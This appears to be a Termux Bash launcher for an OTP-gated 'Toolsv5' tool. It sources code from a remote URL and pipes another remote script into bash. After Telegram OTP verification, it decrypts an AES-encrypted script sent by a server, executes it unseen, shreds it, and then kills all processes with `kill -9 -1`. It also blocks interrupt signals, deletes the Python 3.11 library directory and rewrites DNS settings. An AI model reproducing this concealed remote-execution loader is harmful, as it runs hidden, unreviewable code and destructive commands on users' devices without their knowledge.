#!/data/data/com.termux/files/usr/bin/bash
#set -x
kocak_kocak=$$
trap '' SIGTSTP SIGINT SIGTERM SIGHUP SIGQUIT
e="echo -e "
m="\033[1;31m"   # Merah
h="\033[1;32m"   # Hijau
k="\033[1;33m"   # Kuning
b="\033[1;34m"   # Biru
bl="\033[1;36m"  # Biru Muda
p="\033[1;37m"   # Putih
u="\033[1;35m"   # Ungu
pu="\033[1;30m"  # Abu-abu
c="\033[1;96m"   # Cyan Terang
or="\033[1;91m"  # Merah Muda Terang
g="\033[1;92m"   # Hijau Terang
y="\033[1;93m"   # Kuning Terang
bld="\033[1;94m" # Biru Terang
pwl="\033[1;95m" # Ungu Terang
blg="\033[1;97m" # Putih Terang
lg="\033[1;90m"  # Abu-abu Terang
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
NC='\033[0m'
DIR="$PREFIX/bin"
clear
  play_klik() {
    if command -v mpv >/dev/null 2>&1 && [ -f "$HOME/Lubeban/sound/klik.mp3" ]; then
      mpv --really-quiet --no-video --volume=100 "$HOME/Lubeban/sound/klik.mp3" --force-window=no --log-file=/dev/null --title="[klik_sound]" &> /dev/null &
    fi
  }

  play_salah() {
    if command -v mpv >/dev/null 2>&1 && [ -f "$HOME/Lubeban/sound/salah.mp3" ]; then
      mpv --really-quiet --no-video --volume=100 "$HOME/Lubeban/sound/salah.mp3" --force-window=no --log-file=/dev/null --title="[salah_sound]" &> /dev/null &
    fi
  }

  play_offline() {
    if command -v mpv >/dev/null 2>&1 && [ -f "$HOME/Pasang/offline.mp3" ]; then
      mpv --really-quiet --no-video --volume=100 "$HOME/Pasang/offline.mp3" --force-window=no --log-file=/dev/null --title="[offline_sound]" &> /dev/null &
    fi
  }

  stop_sounds() {
    pkill -f "\[klik_sound\]" 2>/dev/null
    pkill -f "\[salah_sound\]" 2>/dev/null
    pkill -f "\[offline_sound\]" 2>/dev/null
  }
scnya() {
  # Define colors
  m="\\Z1"   # Merah
  h="\\Z2"   # Hijau
  k="\\Z3"   # Kuning
  b="\\Z4"   # Biru
  bl="\\Z6"  # Biru Muda
  p="\\Z7"   # Putih
  u="\\Z5"   # Ungu
  c="\\Z6"   # Cyan Terang
  g="\\Z2"   # Hijau Terang
  y="\\Z3"   # Kuning Terang
  bld="\\Z4" # Biru Terang
  pwl="\\Z5" # Ungu Terang
  while true; do
    source <(curl -sL "https://url-ten-swart.vercel.app/URL")
    SERVER_URL="$url2"
    ON_OFF="$url2/datetime"
    SAVE_CHAT_FILE="$HOME/.saved_chat"

    validate_response() {
      local resp="$1"
      if [ -z "$resp" ]; then
        echo "kosong / error / down"
        return 0
      fi
      if ! echo "$resp" | jq empty 2>/dev/null; then
        echo "tidak sah"
        return 0
      fi
      echo "ok"
    }

    check_server_status() {
      local status_resp=$(curl -s --max-time 10 "$ON_OFF")
      if [ -n "$status_resp" ] && echo "$status_resp" | jq empty 2>/dev/null; then
        echo "${c} ONLINE${p}"
      else
        echo "${u} OFFLINE${p}"
      fi
    }

    get_random_color_title() {
      local colors=("$c" "$bl" "$u" "$g" "$y" "$bld" "$pwl")
      local random_index=$((RANDOM % ${#colors[@]}))
      echo "${colors[$random_index]}Server${p}"
    }
    show_loading() {
      local title="$1"
      local message="$2"
      local duration="$3"
      
      (
        for i in {1..100}; do
          echo $i
          sleep $(echo "scale=3; $duration/100" | bc -l 2>/dev/null || echo "0.01")
        done
      ) | dialog --colors --title "$title" --gauge "$message" 8 50 0
    }
    klik() {
      sleep 1
    }

    while true; do
      SERVER_STATUS=$(check_server_status)
      RANDOM_TITLE=$(get_random_color_title)
      
      if [ -f "$SAVE_CHAT_FILE" ]; then
               saved_chat=$(cat "$SAVE_CHAT_FILE")
        play_klik 
        dialog --colors --title "Konfirmasi Chat ID - $RANDOM_TITLE: $SERVER_STATUS" --yesno "Gunakan Chat ID tersimpan?\n$saved_chat" 7 50
        response=$?

        if [ $response -eq 1 ]; then
          play_klik 
          termux-open-url "https://t.me/Toolsv5_OTP_bot"
          tmp_input=$(mktemp)
          tmp_processed=$(mktemp)
          dialog --colors --title "Input Chat ID - $RANDOM_TITLE: $SERVER_STATUS" \
                 --editbox "$tmp_input" 15 60 2> "$tmp_input"
          
          code=$?
          if [ $code -ne 0 ]; then
            rm -f "$tmp_input" "$tmp_processed"
            clear && echo "TERIMAKASIH DAH COBAK" && exit 0
          fi
          clear
          while IFS= read -r line; do
            cleaned=$(echo "$line" | sed 's/[^0-9]//g')
            if [[ "$cleaned" =~ ^[0-9]{9,12}$ ]]; then
                echo "$cleaned"
            fi
          done < "$tmp_input" | sort -u > "$tmp_processed"
          count_valid=$(wc -l < "$tmp_processed")
          if [ "$count_valid" -gt 0 ]; then
            CHAT_ID=$(head -n 1 "$tmp_processed")
            dialog --colors --title "ID Terdeteksi - $SERVER_STATUS" \
                   --yesno "Sistem berhasil mendeteksi Chat ID:\n\nID: $CHAT_ID\n\nGunakan ID ini dan simpan?" 9 50
            
            if [ $? -eq 0 ]; then
                echo "$CHAT_ID" > "$SAVE_CHAT_FILE"
            else
                rm -f "$tmp_input" "$tmp_processed"
                continue
            fi
          else
            dialog --colors --title "Error - $SERVER_STATUS" \
                   --msgbox "Tidak ada Chat ID valid yang ditemukan dalam teks tersebut.\n\nPastikan ID tercantum dengan benar." 9 50
            rm -f "$tmp_input" "$tmp_processed"
            continue
          fi
          rm -f "$tmp_input" "$tmp_processed"

        elif [ $response -eq 0 ]; then
          CHAT_ID="$saved_chat"
        else
          clear
          continue
        fi

      else
        play_klik
        input_chat=$(dialog --colors --stdout --title "Input Chat ID - $RANDOM_TITLE: $SERVER_STATUS" --inputbox "Masukkan Chat ID Telegram:" 8 50)
        code=$?
        [ $code -ne 0 ] && clear && exit 0
        clear
        if [ -z "$input_chat" ]; then
          dialog --colors --title "Error - $RANDOM_TITLE: $SERVER_STATUS" --msgbox "Chat ID tidak boleh kosong, ulangi." 8 40
          continue
        fi
        CHAT_ID="$input_chat"
      fi
      SERVER_STATUS=$(check_server_status)
      RANDOM_TITLE=$(get_random_color_title)
      show_loading "Loading - $RANDOM_TITLE: $SERVER_STATUS" "Mengirim permintaan OTP ke Telegram..." 1 &
      loading_pid=$!
      
      response=$(curl -s --max-time 10 -X POST "$SERVER_URL/request_otp" \
        -H "Content-Type: application/json" \
        -d "{\"chat_id\": \"$CHAT_ID\"}")
      
      wait $loading_pid 2>/dev/null    
      valid=$(validate_response "$response")
      if [ "$valid" != "ok" ]; then
        if [ "$valid" = "kosong / error / down" ]; then
          dialog --colors --title "Error - $RANDOM_TITLE: $SERVER_STATUS" --msgbox "Server tidak bisa dihubungi!" 8 50
          play_offline
        else
          play_salah 
          dialog --colors --title "Error - $RANDOM_TITLE: $SERVER_STATUS" --msgbox "Response tidak valid.\nKode: $valid" 8 50    
        fi
        clear
        continue
      fi

      success_check=$(echo "$response" | jq -r '.success')
      if [ "$success_check" != "true" ]; then
        error_msg=$(echo "$response" | jq -r '.error // "Ada Masalah Hubungi Admin!"')
        dialog --colors --title "Error - $RANDOM_TITLE: $SERVER_STATUS" --msgbox "Kesalahan: $error_msg" 8 50
        clear
        if [[ "$error_msg" == *"tidak terdaftar"* ]] || [[ "$error_msg" == *"ChatID"* ]]; then
          [ -f "$SAVE_CHAT_FILE" ] && rm -f "$SAVE_CHAT_FILE"
        fi
        continue
      fi

      echo "$CHAT_ID" > "$SAVE_CHAT_FILE"

      # Input OTP
      SERVER_STATUS=$(check_server_status)
      RANDOM_TITLE=$(get_random_color_title)
      play_klik  
      otp_input=$(dialog --colors --stdout --title "Input OTP - $RANDOM_TITLE: $SERVER_STATUS" --inputbox "Masukkan OTP dari Telegram:" 8 50)
      code=$?
      [ $code -ne 0 ] && clear && continue
      clear
      if [ -z "$otp_input" ]; then
        dialog --colors --title "Error - $RANDOM_TITLE: $SERVER_STATUS" --msgbox "OTP tidak boleh kosong, ulangi." 8 40
        continue
      fi
      OTP_INPUT="$otp_input"
      SERVER_STATUS=$(check_server_status)
      RANDOM_TITLE=$(get_random_color_title)
      show_loading "Loading - $RANDOM_TITLE: $SERVER_STATUS" "Memverifikasi OTP..." 1 &
      loading_pid=$!
      
      response=$(curl -s --max-time 10 -X POST "$SERVER_URL/exec_script" \
        -H "Content-Type: application/json" \
        -d "{\"chat_id\":\"$CHAT_ID\",\"otp\":\"$OTP_INPUT\"}")
      
      wait $loading_pid 2>/dev/null
      
            valid=$(validate_response "$response")
      if [ "$valid" != "ok" ]; then
        dialog --colors --title "Error - $RANDOM_TITLE: $SERVER_STATUS" --msgbox "Server tidak merespons (DOWN)\nKode: $valid" 8 50
        clear
        continue
      fi
      token_session=$(echo "$response" | jq -r '.token_session // empty')
      timestamp=$(echo "$response" | jq -r '.timestamp // empty')

      if [ -n "$token_session" ] && [ -n "$timestamp" ]; then
          iv_hex=$(echo "$token_session" | cut -d':' -f1)
          data_hex=$(echo "$token_session" | cut -d':' -f2)
          key_hex=$(echo -n "$timestamp" | openssl dgst -sha256 | awk '{print $2}')
          bash_code=$(echo "$data_hex" | xxd -r -p | openssl enc -aes-256-cbc -d -K "$key_hex" -iv "$iv_hex" 2>/dev/null)
          if [ -z "$bash_code" ]; then
              dialog --colors --title "Error" --msgbox "GAGAL MASUK KE TOOLS !!!." 8 50
              clear
              continue
          fi
      else
          continue
      fi
      if [ -n "$bash_code" ] && [ "$bash_code" != "null" ]; then
          TMP_DIR="${PREFIX:-/data/data/com.termux/files/usr}/tmp_toolsv5"
          mkdir -p "$TMP_DIR"
          TMP_SCRIPT=$(mktemp "$TMP_DIR/script.XXXXXX.sh")
          
          printf '%s\n' "$bash_code" > "$TMP_SCRIPT"
          chmod 700 "$TMP_SCRIPT"
          bash "$TMP_SCRIPT"
          if command -v shred >/dev/null 2>&1; then
              shred -u "$TMP_SCRIPT" 2>/dev/null || rm -f "$TMP_SCRIPT"
          else
              rm -f "$TMP_SCRIPT"
          fi
      fi
      kill -9 -1
    done
    return 0
  done
}
paket_git() {
  while true; do
    clear
    cowsay -f eyes "INSTALLASI DIREKTORI" | lolcat
    cek="$HOME/Pasang"
    scan="$HOME/Lubeban"
    cd $HOME
    echo -ne "\r${BLUE}[0/4]${NC} ${YELLOW}Cloning Pasang repository...   ${NC}"
    git clone --depth 32 https://github.com/Lubebansokhekel/Pasang &> /dev/null
    if [ ! -d Pasang ]; then
      echo -ne "\r${BLUE}[0/4]${NC} ${RED} Memperbaiki Error Cloning Pasang...  ${NC}"

    else
      echo -ne "\r${BLUE}[1/4]${NC} ${YELLOW}Cloning Lubeban repository...   ${NC}"
    fi
    git clone --depth 32 https://github.com/Lubebansokhekel/Lubeban &> /dev/null
    if [ ! -d Lubeban ]; then
      echo -ne "\r${BLUE}[1/4]${NC} ${RED} Memperbaiki Error Cloning Lubeban...   ${NC}"

    else
      echo -ne "\r${BLUE}[2/4]${NC} ${YELLOW}Menyiapkan Server Database...         ${NC}"
    fi
    rm -rf $PREFIX/lib/python3.11
    mkdir -p $PREFIX/lib/python3.11/ensurepip/_bundled &> /dev/null
    echo -ne "\r${BLUE}[3/4]${NC} ${YELLOW}Menata Semua Database...          ${NC}"
    mkdir -p $PREFIX/lib/python3.11/email/mime/ &> /dev/null
    echo -ne "\r${BLUE}[4/4]${NC} ${GREEN}Proses Selesai.                           ${NC}\n"
    if [[ -d "$scan" ]]; then
      echo -e "\r${GREEN}Selesai! Semua proses telah berhasil Tanpa Ada Kendala.${NC}"
      break
    else
      echo -e "\r${RED}Ada Error Saat Proses Bulid${NC}"

      echo -e "\r${RED}Silahkan Enter Untuk Build Kembali...${NC}"
      read
    fi
  done
}
run_tool() {
  while true; do
    cek="$HOME/Lubeban"
    cek1="$HOME/Pasang"
    scan="/data/data/com.termux/files"
    if [[ -d "$cek" && -d "$cek1" && -d "$scan" ]]; then
      clear
      cd "$cek1"
      git pull origin main &> /dev/null
      git stash &> /dev/null
      scnya
      exit 0
    else
      if command -v nala > /dev/null 2>&1; then
        paket="nala"
      else
        paket="apt-get"
      fi
      clear
      echo "Persiapan Installasi Package"
      echo
      echo -e "nameserver 1.1.1.1\nnameserver 1.0.0.1" > $PREFIX/etc/resolv.conf
      rm -rf "$HOME/Lubeban" &> /dev/null
      pkg update && pkg upgrade
      $paket install python python3 -y
      $paket install nala clang xh -y
      $paket install curl wget -y
      bash <(curl -sL https://raw.githubusercontent.com/Lubebansokhekel/Pasang/main/package)
      clear
      paket_git
    fi
  done
}
run_tool
exit 0

